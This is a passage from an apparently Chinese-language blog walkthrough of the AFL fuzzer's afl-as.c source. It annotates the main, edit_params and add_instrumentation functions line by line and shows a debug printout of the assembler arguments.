class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  s32 pid;<br>  u32 rand_seed;<br>  <span class="hljs-type">int</span> status;<br>  u8* inst_ratio_str = getenv(<span class="hljs-string">&quot;AFL_INST_RATIO&quot;</span>);        <span class="hljs-comment">// 获取环境变量AFL_INST_RATIO</span><br>                                                        <span class="hljs-comment">// 控制检测分支的概率(从0到100之间)</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">tv</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timezone</span> <span class="hljs-title">tz</span>;</span><br><br>  clang_mode = !!getenv(CLANG_ENV_VAR); <span class="hljs-comment">// 获取环境变量CLANG_ENV_VAR，并转换为bool类型</span><br><br>  <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">2</span>) &amp;&amp; !getenv(<span class="hljs-string">&quot;AFL_QUIET&quot;</span>)) &#123;      <span class="hljs-comment">// 获取环境变量AFL_QUIET</span><br><br>    SAYF(cCYA <span class="hljs-string">&quot;afl-as &quot;</span> cBRI VERSION cRST <span class="hljs-string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);<br> <br>  &#125; <span class="hljs-keyword">else</span> be_quiet = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;       <span class="hljs-comment">// 若参数个数小于2，打印错误信息并返回</span><br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span><br>         <span class="hljs-string">&quot;This is a helper application for afl-fuzz. It is a wrapper around GNU &#x27;as&#x27;,\n&quot;</span><br>         <span class="hljs-string">&quot;executed by the toolchain whenever using afl-gcc or afl-clang. You probably\n&quot;</span><br>         <span class="hljs-string">&quot;don&#x27;t want to run this program directly.\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;Rarely, when dealing with extremely complex projects, it may be advisable to\n&quot;</span><br>         <span class="hljs-string">&quot;set AFL_INST_RATIO to a value less than 100 in order to reduce the odds of\n&quot;</span><br>         <span class="hljs-string">&quot;instrumenting every discovered branch.\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br><br>  &#125;<br><br>  gettimeofday(&amp;tv, &amp;tz);       <span class="hljs-comment">// 获取精确时间，时间信息存储到tv，时区信息存储到tz中</span><br><br>  rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();        <span class="hljs-comment">// 根据时间及进程id设置rand_seed</span><br><br>  srandom(rand_seed);<br><br>  edit_params(argc, argv);      <span class="hljs-comment">// 解析并修改传递给as的变量</span><br><br>  <span class="hljs-keyword">if</span> (inst_ratio_str) &#123; <span class="hljs-comment">// 若inst_ratio_str不为空，则赋值给inst_ratio</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(inst_ratio_str, <span class="hljs-string">&quot;%u&quot;</span>, &amp;inst_ratio) != <span class="hljs-number">1</span> || inst_ratio &gt; <span class="hljs-number">100</span>) <br>      FATAL(<span class="hljs-string">&quot;Bad value of AFL_INST_RATIO (must be between 0 and 100)&quot;</span>);<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (getenv(AS_LOOP_ENV_VAR))  <span class="hljs-comment">// 获取环境变量AS_LOOP_ENV_VAR，若不返回0，则报错</span><br>    FATAL(<span class="hljs-string">&quot;Endless loop when calling &#x27;as&#x27; (remove &#x27;.&#x27; from your PATH)&quot;</span>);<br><br>  setenv(AS_LOOP_ENV_VAR, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">1</span>);      <span class="hljs-comment">// 设置环境变量AS_LOOP_ENV_VAR=1</span><br><br>  <span class="hljs-comment">/* When compiling with ASAN, we don&#x27;t have a particularly elegant way to skip</span><br><span class="hljs-comment">     ASAN-specific branches. But we can probabilistically compensate for</span><br><span class="hljs-comment">     that... */</span><br><br>  <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_USE_ASAN&quot;</span>) || getenv(<span class="hljs-string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;       <span class="hljs-comment">// 若设置了ascn或者msan，设置inst_ratio为原来的1/3</span><br>    sanitizer = <span class="hljs-number">1</span>;<br>    inst_ratio /= <span class="hljs-number">3</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (!just_version) add_instrumentation();     <span class="hljs-comment">// 若不是仅仅检测版本信息，则调用add_instrumentation进行插桩</span><br><br>  <span class="hljs-keyword">if</span> (!(pid = fork())) &#123;        <span class="hljs-comment">// fork子进程调用as_params[0]</span><br><br>    execvp(as_params[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span>**)as_params);<br>    FATAL(<span class="hljs-string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="hljs-number">0</span>]);<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;fork() failed&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (waitpid(pid, &amp;status, <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;waitpid() failed&quot;</span>);        <span class="hljs-comment">// 父进程等待子进程结束</span><br><br>  <span class="hljs-keyword">if</span> (!getenv(<span class="hljs-string">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) unlink(modified_file);      <span class="hljs-comment">// 获取环境变量AFL_KEEP_ASSEMBLY，若返回0，则删除modified_file</span><br><br>  <span class="hljs-built_in">exit</span>(WEXITSTATUS(status));<br><br>&#125;<br></code></pre></td></tr></table></figure><p>为了方便查看as_params的值，我们追加如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(as_params); i++) <br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;as_params[%d]:%s\n&quot;</span>, i, as_params[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>当我们执行<code>afl-as -o myafl.o myafl.s</code>时，输出如下：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">as_params[<span class="hljs-number">0</span>]<span class="hljs-symbol">:as</span><br>as_params[<span class="hljs-number">1</span>]<span class="hljs-symbol">:-o</span><br>as_params[<span class="hljs-number">2</span>]<span class="hljs-symbol">:/home/p2lst/Documents/fuzz/test1/myafl</span>.o<br>as_params[<span class="hljs-number">3</span>]<span class="hljs-symbol">:/home/p2lst/Documents/fuzz/test1/</span>.afl<span class="hljs-number">-66163</span><span class="hljs-number">-1696406546</span>.s<br>as_params[<span class="hljs-number">4</span>]<span class="hljs-symbol">:</span>(null)<br>as_params[<span class="hljs-number">5</span>]<span class="hljs-symbol">:</span>(null)<br>as_params[<span class="hljs-number">6</span>]<span class="hljs-symbol">:</span>(null)<br>as_params[<span class="hljs-number">7</span>]<span class="hljs-symbol">:</span>(null)<br></code></pre></td></tr></table></figure><p>可以看到，最终执行的是as。</p><p>由此可见，afl-as也是对as进行的再封装。</p><h3 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h3><p>解析并修改传递给as的变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Examine and modify parameters to pass to &#x27;as&#x27;. Note that the file name</span><br><span class="hljs-comment">   is always the last parameter passed by GCC, so we exploit this property</span><br><span class="hljs-comment">   to keep the code simple. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">edit_params</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  u8 *tmp_dir = getenv(<span class="hljs-string">&quot;TMPDIR&quot;</span>), *afl_as = getenv(<span class="hljs-string">&quot;AFL_AS&quot;</span>);   <span class="hljs-comment">// 获取环境变量TMPDIR，与AFL_AS</span><br>  u32 i;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__        <span class="hljs-comment">// apple平台</span></span><br><br>  u8 use_clang_as = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* On MacOS X, the Xcode cctool &#x27;as&#x27; driver is a bit stale and does not work</span><br><span class="hljs-comment">     with the code generated by newer versions of clang that are hand-built</span><br><span class="hljs-comment">     by the user. See the thread here: http://goo.gl/HBWDtn.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     To work around this, when using clang and running without AFL_AS</span><br><span class="hljs-comment">     specified, we will actually call &#x27;clang -c&#x27; instead of &#x27;as -q&#x27; to</span><br><span class="hljs-comment">     compile the assembly file.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     The tools aren&#x27;t cmdline-compatible, but at least for now, we can</span><br><span class="hljs-comment">     seemingly get away with this by making only very minor tweaks. Thanks</span><br><span class="hljs-comment">     to Nico Weber for the idea. */</span><br><br>  <span class="hljs-keyword">if</span> (clang_mode &amp;&amp; !afl_as) &#123;<br><br>    use_clang_as = <span class="hljs-number">1</span>;<br><br>    afl_as = getenv(<span class="hljs-string">&quot;AFL_CC&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!afl_as) afl_as = getenv(<span class="hljs-string">&quot;AFL_CXX&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!afl_as) afl_as = <span class="hljs-string">&quot;clang&quot;</span>;<br><br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>  <span class="hljs-comment">/* Although this is not documented, GCC also uses TEMP and TMP when TMPDIR</span><br><span class="hljs-comment">     is not set. We need to check these non-standard variables to properly</span><br><span class="hljs-comment">     handle the pass_thru logic later on. */</span><br><br>  <span class="hljs-keyword">if</span> (!tmp_dir) tmp_dir = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);       <span class="hljs-comment">// 获取环境变量TEMP</span><br>  <span class="hljs-keyword">if</span> (!tmp_dir) tmp_dir = getenv(<span class="hljs-string">&quot;TMP&quot;</span>);        <span class="hljs-comment">// 获取环境变量TMP</span><br>  <span class="hljs-keyword">if</span> (!tmp_dir) tmp_dir = <span class="hljs-string">&quot;/tmp&quot;</span>;       <span class="hljs-comment">// 若上述失败，设置tmp_dir=&quot;/tmp&quot;</span><br><br>  as_params = ck_alloc((argc + <span class="hljs-number">32</span>) * <span class="hljs-keyword">sizeof</span>(u8*));      <span class="hljs-comment">// 为as_params分配足够多的空间</span><br><br>  as_params[<span class="hljs-number">0</span>] = afl_as ? afl_as : (u8*)<span class="hljs-string">&quot;as&quot;</span>;   <span class="hljs-comment">// 若afl_as为空，设置as_params[0]=as</span><br><br>  as_params[argc] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 追加NULL，作为as_params数组结束</span><br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; argc - <span class="hljs-number">1</span>; i++) &#123;      <span class="hljs-comment">// 循环遍历argv</span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[i], <span class="hljs-string">&quot;--64&quot;</span>)) use_64bit = <span class="hljs-number">1</span>;        <span class="hljs-comment">// 若遍历到--64，设置use_64bit为1</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[i], <span class="hljs-string">&quot;--32&quot;</span>)) use_64bit = <span class="hljs-number">0</span>;   <span class="hljs-comment">// 若遍历到--32，设置use_64bit为0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__        <span class="hljs-comment">// apple平台</span></span><br><br>    <span class="hljs-comment">/* The Apple case is a bit different... */</span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[i], <span class="hljs-string">&quot;-arch&quot;</span>) &amp;&amp; i + <span class="hljs-number">1</span> &lt; argc) &#123;<br><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[i + <span class="hljs-number">1</span>], <span class="hljs-string">&quot;x86_64&quot;</span>)) use_64bit = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[i + <span class="hljs-number">1</span>], <span class="hljs-string">&quot;i386&quot;</span>))<br>        FATAL(<span class="hljs-string">&quot;Sorry, 32-bit Apple platforms are not supported.&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-comment">/* Strip options that set the preference for a particular upstream</span><br><span class="hljs-comment">       assembler in Xcode. */</span><br><br>    <span class="hljs-keyword">if</span> (clang_mode &amp;&amp; (!<span class="hljs-built_in">strcmp</span>(argv[i], <span class="hljs-string">&quot;-q&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(argv[i], <span class="hljs-string">&quot;-Q&quot;</span>)))<br>      <span class="hljs-keyword">continue</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>    as_params[as_par_cnt++] = argv[i];  <span class="hljs-comment">// 将argv添加到as_params中</span><br><br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__        <span class="hljs-comment">// apple平台</span></span><br><br>  <span class="hljs-comment">/* When calling clang as the upstream assembler, append -c -x assembler</span><br><span class="hljs-comment">     and hope for the best. */</span><br><br>  <span class="hljs-keyword">if</span> (use_clang_as) &#123;   <span class="hljs-comment">// 若use_clang_as不为空，则默认添加以下参数</span><br><br>    as_params[as_par_cnt++] = <span class="hljs-string">&quot;-c&quot;</span>;     <br>    as_params[as_par_cnt++] = <span class="hljs-string">&quot;-x&quot;</span>;<br>    as_params[as_par_cnt++] = <span class="hljs-string">&quot;assembler&quot;</span>;<br><br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>  input_file = argv[argc - <span class="hljs-number">1</span>];  <span class="hljs-comment">// 输入文件为argv最后一个参数的值</span><br><br>  <span class="hljs-keyword">if</span> (input_file[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;-&#x27;</span>) &#123;   <span class="hljs-comment">// 判断第一个字符是否为-</span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(input_file + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;-version&quot;</span>)) &#123;  <span class="hljs-comment">// 判断是否为-version，若是，表示仅仅查看版本信息，设置just_version=1</span><br>      just_version = <span class="hljs-number">1</span>;<br>      modified_file = input_file;<br>      <span class="hljs-keyword">goto</span> wrap_things_up;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (input_file[<span class="hljs-number">1</span>]) FATAL(<span class="hljs-string">&quot;Incorrect use (not called through afl-gcc?)&quot;</span>);    <span class="hljs-comment">// 若input_file[1]为空，报错</span><br>      <span class="hljs-keyword">else</span> input_file = <span class="hljs-literal">NULL</span>;<br><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br><br>    <span class="hljs-comment">/* Check if this looks like a standard invocation as a part of an attempt</span><br><span class="hljs-comment">       to compile a program, rather than using gcc on an ad-hoc .s file in</span><br><span class="hljs-comment">       a format we may not understand. This works around an issue compiling</span><br><span class="hljs-comment">       NSS. */</span><br><br>    <span class="hljs-comment">// 若input文件包含tmp_dir,或者/var/tmp,或者/tmp,则设置pass_thru=0，否则设置为1，该选项会影响后续插桩</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(input_file, tmp_dir, <span class="hljs-built_in">strlen</span>(tmp_dir)) &amp;&amp;<br>        <span class="hljs-built_in">strncmp</span>(input_file, <span class="hljs-string">&quot;/var/tmp/&quot;</span>, <span class="hljs-number">9</span>) &amp;&amp;<br>        <span class="hljs-built_in">strncmp</span>(input_file, <span class="hljs-string">&quot;/tmp/&quot;</span>, <span class="hljs-number">5</span>)) pass_thru = <span class="hljs-number">1</span>; <br>  &#125;<br><br>  modified_file = alloc_printf(<span class="hljs-string">&quot;%s/.afl-%u-%u.s&quot;</span>, tmp_dir, getpid(),<br>                               (u32)time(<span class="hljs-literal">NULL</span>));        <span class="hljs-comment">// 设置修改modified_file字符串</span><br><br>wrap_things_up:<br><br>  as_params[as_par_cnt++] = modified_file;      <span class="hljs-comment">// 添加到as_params参数中</span><br>  as_params[as_par_cnt]   = <span class="hljs-literal">NULL</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h3><p>处理输入文件，对汇编文件<strong>基本块</strong>进行插桩。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Process input file, generate modified_file. Insert instrumentation in all</span><br><span class="hljs-comment">   the appropriate places. */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">add_instrumentation</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  <span class="hljs-type">static</span> u8 line[MAX_LINE];<br><br>  FILE* inf;<br>  FILE* outf;<br>  s32 outfd;<br>  u32 ins_lines = <span class="hljs-number">0</span>;<br><br>  u8  instr_ok = <span class="hljs-number">0</span>, skip_csect = <span class="hljs-number">0</span>, skip_next_label = <span class="hljs-number">0</span>,<br>      skip_intel = <span class="hljs-number">0</span>, skip_app = <span class="hljs-number">0</span>, instrument_next = <span class="hljs-number">0</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br><br>  u8* colon_pos;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>  <span class="hljs-keyword">if</span> (input_file) &#123;     <span class="hljs-comment">// 判断input_file是否存在，并打开</span><br><br>    inf = fopen(input_file, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!inf) PFATAL(<span class="hljs-string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);<br><br>  &#125; <span class="hljs-keyword">else</span> inf = <span class="hljs-built_in">stdin</span>;<br><br>  outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="hljs-number">0600</span>);       <span class="hljs-comment">// 打开modified_file</span><br><br>  <span class="hljs-keyword">if</span> (outfd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);<br><br>  outf = fdopen(outfd, <span class="hljs-string">&quot;w&quot;</span>);    <span class="hljs-comment">// 以&quot;w&quot;模式打开modified_file</span><br><br>  <span class="hljs-keyword">if</span> (!outf) PFATAL(<span class="hljs-string">&quot;fdopen() failed&quot;</span>);  <br><br>  <span class="hljs-keyword">while</span> (fgets(line, MAX_LINE, inf)) &#123;  <span class="hljs-comment">// 循环读取inf文件的单行内容到line，最多读取8192字节</span><br><br>    <span class="hljs-comment">/* In some cases, we want to defer writing the instrumentation trampoline</span><br><span class="hljs-comment">       until after all the labels, macros, comments, etc. If we&#x27;re in this</span><br><span class="hljs-comment">       mode, and if the line starts with a tab followed by a character, dump</span><br><span class="hljs-comment">       the trampoline now. */</span><br>    <br>    <span class="hljs-comment">/* 若pass_thru,skip_intel,skip_app,skip_csect为空，instr_ok与instument_next为真，</span><br><span class="hljs-comment">       且line[0]为&#x27;\t&#x27;,line[1]为字符，则进行插桩。</span><br><span class="hljs-comment">       即判断符合插桩的条件 */</span><br>    <span class="hljs-keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;<br>        instrument_next &amp;&amp; line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\t&#x27;</span> &amp;&amp; <span class="hljs-built_in">isalpha</span>(line[<span class="hljs-number">1</span>])) &#123;<br><br>      <span class="hljs-built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,<br>              R(MAP_SIZE));     <span class="hljs-comment">// 插桩，将trampoline_fmt_64或者trampoline_fmt_32写入outf</span><br><br>      instrument_next = <span class="hljs-number">0</span>;<br>      ins_lines++;      <span class="hljs-comment">// 插桩计数+1</span><br><br>    &#125;<br><br>    <span class="hljs-comment">/* Output the actual line, call it a day in pass-thru mode. */</span><br><br>    <span class="hljs-built_in">fputs</span>(line, outf);  <span class="hljs-comment">// 将原始line写入outf</span><br><br>    <span class="hljs-keyword">if</span> (pass_thru) <span class="hljs-keyword">continue</span>;    <span class="hljs-comment">// 若pass_thru不为空，则跳过本次循环</span><br><br>    <span class="hljs-comment">/* All right, this 